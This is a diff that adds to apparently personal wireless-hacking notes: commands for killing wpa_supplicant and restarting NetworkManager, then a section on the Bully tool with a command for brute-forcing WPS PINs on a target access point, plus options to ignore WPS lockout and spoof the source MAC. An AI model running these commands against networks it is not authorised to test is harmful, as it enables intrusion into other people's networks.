@@ -126,7 +126,40 @@ dhclient -4 will give ipv4 address
 
 check for IP address using ipconfig
 
+Disconnect from the network
+-------------------
+To re-enable network services, kill the wpa_supplicant process and restart NetworkManager.service
 
+ps -ef | grep qpa_supplicant
+sudo kill ####
+
+or
+
+sudo airmon-ng check kill
+
+then
+
+sudo systemctl enable NetworkManager.service
+
+or
+
+sudo systemctl restart NetworkManager.service
+
+
+
+Bully
+--------------------------------
+Bully is a newer program than Reaver for WPS brute force attacks
+
+sudo apt install bully
+sudo bully <interface> -b <BSSID> -c <CHANNEL> -v 4 -d
+
+Additional options:
+-e SSID
+-F (force continue despite errors)
+-D (detect WPS lockout)
+-L (ignore WPS lockout messages sent from the AP)
+-s SOURCE_MAC
 
 
 
